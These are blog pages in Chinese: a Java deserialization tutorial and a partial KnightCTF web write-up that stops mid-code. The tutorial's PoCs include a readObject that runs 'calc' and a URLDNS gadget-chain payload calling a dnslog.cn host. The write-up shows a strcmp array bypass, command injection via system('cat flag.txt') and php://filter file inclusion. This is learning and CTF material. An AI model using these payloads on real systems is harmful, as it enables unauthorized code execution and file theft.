<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> src.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化文件 UnserializeTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422174102802.png" alt="image-20230422174102802"></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422174116591.png" alt="image-20230422174116591"></p>
<p>解析</p>
<ul>
<li><strong>SerializationTest.java</strong></li>
</ul>
<p>这里我们将代码进行了封装，将序列化功能封装进了 serialize这个方法里面，在序列化当中，我们通过这个FileOutputStream输出流对象，将序列化的对象输出到ser.bin当中。再调用 oos 的writeObject方法，将对象进行序列化操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>UnserializeTest.java</strong></li>
</ul>
<p>进行反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">Object obj = ois.readObject();</span><br></pre></td></tr></table></figure>

<h2 id="Serializable-接口"><a href="#Serializable-接口" class="headerlink" title="Serializable 接口"></a>Serializable 接口</h2><p>(1) 序列化类的属性没有实现 <strong>Serializable</strong>那么在序列化就会报错</p>
<p>只有实现 了<strong>Serializable</strong>或者 <strong>Externalizable</strong>接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）</p>
<p>Serializable 接口是 Java 提供的序列化接口，它是一个空接口，所以其实我们不需要实现什么。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。如果我们此处将 Serializable 接口删除掉的话，会导致如下结果。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422174727670.png" alt="image-20230422174727670"></p>
<p>(2) 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象。</p>
<p>(3)一个实现 <strong>Serializable</strong>接口的子类也是可以被序列化的。</p>
<p>(4) 静态成员变量是不能被序列化</p>
<p>序列化是针对对象属性的，而静态成员变量是属于类的。</p>
<p>(5) transient 标识的对象成员变量不参与序列化</p>
<p>这里我们可以动手实操一下，将 <strong>Person.java</strong>中的<code>name</code>加上<code>transient</code>的类型标识。加完之后再跑我们的序列化与反序列化的两个程序，修改过程与运行结果如图所示。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422175104583.png" alt="image-20230422175104583"></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422175158916.png" alt="image-20230422175158916"></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422175211749.png" alt="image-20230422175211749"></p>
<h1 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h1><p>网上找了个引例，加深我对代码的理解哩。</p>
<p>(1) 入口类的<code>readObject</code>直接调用危险方法</p>
<p>先创建一个恶意类Person</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span><span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span><span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码就是弹计算器的。</p>
<p>先运行序列化程序 ———— “SerializationTest.java”，再运行反序列化程序 ———— “UnserializeTest.java”</p>
<p>这时候就会弹出计算器，也就是<code>calc.exe</code>，是不是帅的飞起哈哈。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422183019221.png" alt="image-20230422183019221"></p>
<p>这是黑客最理想的情况，但是这种情况几乎不会出现。</p>
<p>(2) 入口参数中包含可控类，该类有危险方法，<code>readObject</code>时调用</p>
<p>(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，<code>readObject</code>时调用</p>
<p>(4) 构造函数/静态代码块等类加载时隐式执行</p>
<h1 id="URLDNS实战"><a href="#URLDNS实战" class="headerlink" title="URLDNS实战"></a>URLDNS实战</h1><p>其实还是半懂不懂的，跟着大佬做一做实战。</p>
<p>出发点：URLDNS 在 Java 复杂的反序列化漏洞当中足够简单；URLDNS 就是 ysoserial 中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。</p>
<p>因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次 DNS 请求。</p>
<p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤。</p>
<p>使⽤ Java 内置的类构造，对第三⽅库没有依赖。</p>
<p>在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类，调用<code>openConnection</code>方法，到此处的时候，其实<code>openConnection</code>不是常见函数，就已经难以利用了。</p>
<p>我们先去到 ysoserial 的项目当中，去看看它是如何构造 URLDNS 链的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230422183821562.png" alt="image-20230422183821562"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>URL 是由 HashMap 的<code>put</code>方法产生的，所以我们先跟进<code>put</code>方法当中。<code>put</code>方法之后又是调用了<code>hash</code>方法；<code>hash</code>方法则是调用了<code>hashcode</code>这一函数。</p>
<p>现在我们来实战分析一下，现在双击shift，输入hashmap.java来看看源码。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423191011519.png" alt="image-20230423191011519"></p>
<p>URL 是由 HashMap 的<code>put</code>方法产生的，所以我们先跟进<code>put</code>方法当中。<code>put</code>方法之后又是调用了<code>hash</code>方法；<code>hash</code>方法则是调用了<code>hashcode</code>这一函数。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423191134968.png" alt="image-20230423191134968"></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423191156410.png" alt="image-20230423191156410"></p>
<p>我们看到这个<code>hashCode</code>函数的变量名是 key；那这个 key 是啥啊？<br>噢 ~ 原来 key 是<code>hash</code>这一方法传进的参数！那我们前面写的 key 不就是这个东东吗 ~！</p>
<p>也就是put方法传入了一个key，最后hash方法中又调用了key的hashcode方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashmap.put(<span class="keyword">new</span> URL(<span class="string">&quot;DNS生成的 URL，用dnslog就可以&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传进去两个参数，key = 前面那串网址，value = 1</span></span><br></pre></td></tr></table></figure>

<p>现在跟进URL，去看看 URL 跟进一堆之后的<code>hashCode</code>方法是如何实现的。</p>
<p>跟进 URL，我们肯定是要去寻找 URL 调用的函数的函数（的函数，应该还有好几个的函数，就不写出来了，不然大家就晕了）的<code>hashCode</code>方法。</p>
<p>在左边 Structure 直接寻找<code>hashCode</code>方法，URL 中的<code>hashCode</code>被<code>handler</code>这一对象所调用，<code>handler</code>又是<code>URLStreamHandler</code>的抽象类。我们再去找<code>URLStreamHandler</code>的<code>hashCode</code>方法。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423191919523.png" alt="image-20230423191919523"></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423192109083.png" alt="image-20230423192109083"></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423192225041.png" alt="image-20230423192225041"></p>
<p>终于找到了，这个用于 URLDNS 的方法 ————<code>getHostAddress</code></p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423192304530.png" alt="image-20230423192304530"></p>
<p>这⾥<code>InetAddress.getByName(host)</code>的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p>
<p>所以，⾄此，整个 URLDNS 的Gadget其实清晰⼜简单：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;readObject()</span><br><span class="line">HashMap-&gt;hash()</span><br><span class="line">URL-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure>

<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><strong>SerializationTest.java</strong>文件下添加如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> HashMap&lt;URL,Integer&gt;();</span><br><span class="line">hashmap.put(<span class="keyword">new</span> URL(<span class="string">&quot;DNS生成的 URL，用dnslog就可以&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">serialize(hashmap);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423192620209.png" alt="image-20230423192620209"></p>
<p>我们先把它序列化，按照道理来说，这个过程应该什么都不会发生对吧。</p>
<p>但是确实收到了dnslog信息</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423192914961.png" alt="image-20230423192914961"></p>
<p>还是从原理角度分析，我们回到 URL 这个对象，回到<code>hashCode</code>这里。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423193046221.png" alt="image-20230423193046221"></p>
<p>我们发现，当<code>hashCode</code>的值不等于 -1 的时候，函数就会直接<code>return hashCode</code>而不执行<code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code>的值为 -1，便是发起了请求。</p>
<p>所以我们在没有反序列化的情况下面，就收到了 DNS 请求，这是不正确的。</p>
<p>但是这里就涉及到关于反射的一个庞大知识体系，那个博主在这里也没有讲，直接放出poc</p>
<p><strong>SerializationTest.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> src.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> HashMap&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="comment">// 这里不要发起请求</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://h7xfte.dnslog.cn&quot;</span>);</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field hashcodefile = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefile.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcodefile.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">        hashcodefile.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化的文件无需更改</p>
<p>接着我们运行序列化文件，是收不到 DNS 请求的，而当我们运行反序列化的文件时候，可以收到请求，这就代表着我们的 URLDNS 链构造成功了。</p>
<p><img src="/2023/04/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/image-20230423194403069.png" alt="image-20230423194403069"></p>
]]></content>
      <categories>
        <category>-java</category>
      </categories>
  </entry>
  <entry>
    <title>knight ctf web wp</title>
    <url>/2022/01/21/knight-ctf-web-wp/</url>
    <content><![CDATA[<h1 id="knight-ctf-web-Programming-Misc-wp（部分）"><a href="#knight-ctf-web-Programming-Misc-wp（部分）" class="headerlink" title="knight ctf web Programming  Misc wp（部分）"></a>knight ctf web Programming  Misc wp（部分）</h1><p>今天去打了kinghtctf 哇本来以为什么都做不来就去看个热闹的，(p≧w≦q)没想到还是可以嘛</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165146417.png" alt="image-20220121165146417"></p>
<p>web的现在只做了这么多出来，</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121203443257.png" alt="image-20220121203443257"></p>
<p>七百多个人能拍这我已经满足了(<em>^▽^</em>)，现在总结一下遇到的题</p>
<h2 id="Zero-is-not-the-limit"><a href="#Zero-is-not-the-limit" class="headerlink" title="Zero is not the limit"></a>Zero is not the limit</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165345068.png" alt="image-20220121165345068"></p>
<p>打开这个样子</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165404956.png" alt="image-20220121165404956"></p>
<p>当时找了又找什么都没找到，后来用dirsearch扫了一下，发现了user下面一大堆的东西，然后根据题目的提示，访问目录/user/-1就出来了</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165503058.png" alt="image-20220121165503058"></p>
<h2 id="Find-Pass-Code-1"><a href="#Find-Pass-Code-1" class="headerlink" title="Find Pass Code - 1"></a>Find Pass Code - 1</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165521079.png" alt="image-20220121165521079"></p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165531857.png" alt="image-20220121165531857"></p>
<p>在源码中找到提示</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165549544.png" alt="image-20220121165549544"></p>
<p>设置source参数得到源码</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121165622243.png" alt="image-20220121165622243"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>], <span class="variable">$flag</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;KCTF Flag : <span class="subst">&#123;$flag&#125;</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh....My....God. You entered the wrong pass code.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个简单的strcmp绕过，他不能处理数组类型，一旦输入数组那么就会return0然后就绕过啦啦啦。</p>
<h2 id="Most-Secure-Calculator-1"><a href="#Most-Secure-Calculator-1" class="headerlink" title="Most Secure Calculator - 1"></a>Most Secure Calculator - 1</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170321637.png" alt="image-20220121170321637"></p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170327886.png" alt="image-20220121170327886"></p>
<p>这个超简单，任意命令</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170453019.png" alt="image-20220121170453019"></p>
<p>但是吧flag给过滤了，加个引号啦啦啦(先用ls知道了flag在这里面的)</p>
<p><code>system(&quot;cat flag.txt&quot;)</code></p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170646552.png" alt="image-20220121170646552"></p>
<h2 id="My-PHP-Site"><a href="#My-PHP-Site" class="headerlink" title="My PHP Site"></a>My PHP Site</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170702350.png" alt="image-20220121170702350"></p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170720077.png" alt="image-20220121170720077"></p>
<p>看到那个file参数了吗，文件包含漏洞哦~</p>
<p><code>[Tareq&#39;s Home Page](http://137.184.133.81:15002/?file=php://filter/read=convert.base64-encode/resource=index.php)</code>用伪协议直接读取</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121170907391.png" alt="image-20220121170907391"></p>
<p>base解密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] == <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;ERROR!!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;You are missing the file parameter&lt;/h1&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#note :- secret location /home/tareq/s3crEt_fl49.txt</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Tareq<span class="string">&#x27;s Home Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>看到那个note提示了吗，用伪协议读取他</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171217272.png" alt="image-20220121171217272"></p>
<p>出来啦，base解密就好了<code>KCTF&#123;L0C4L_F1L3_1ncLu710n&#125;</code></p>
<h2 id="Find-Pass-Code-2"><a href="#Find-Pass-Code-2" class="headerlink" title="Find Pass Code - 2"></a>Find Pass Code - 2</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171307229.png" alt="image-20220121171307229"></p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171320185.png" alt="image-20220121171320185"></p>
<p>根据提示还是使用source参数看源码，</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171401661.png" alt="image-20220121171401661"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$old_pass_codes</span> = <span class="keyword">array</span>(<span class="string">&quot;0e215962017&quot;</span>, <span class="string">&quot;0e730083352&quot;</span>, <span class="string">&quot;0e807097110&quot;</span>, <span class="string">&quot;0e840922711&quot;</span>);</span><br><span class="line"><span class="variable">$old_pass_flag</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>]) &amp;&amp; !is_array(<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$old_pass_codes</span> <span class="keyword">as</span> <span class="variable">$old_pass_code</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>] === <span class="variable">$old_pass_code</span>) &#123;</span><br><span class="line">            <span class="variable">$old_pass_flag</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$old_pass_flag</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry ! It&#x27;s an old pass code.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>] == md5(<span class="variable">$_POST</span>[<span class="string">&quot;pass_code&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;KCTF Flag : <span class="subst">&#123;$flag&#125;</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh....My....God. You entered the wrong pass code.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;source&quot;</span>])) 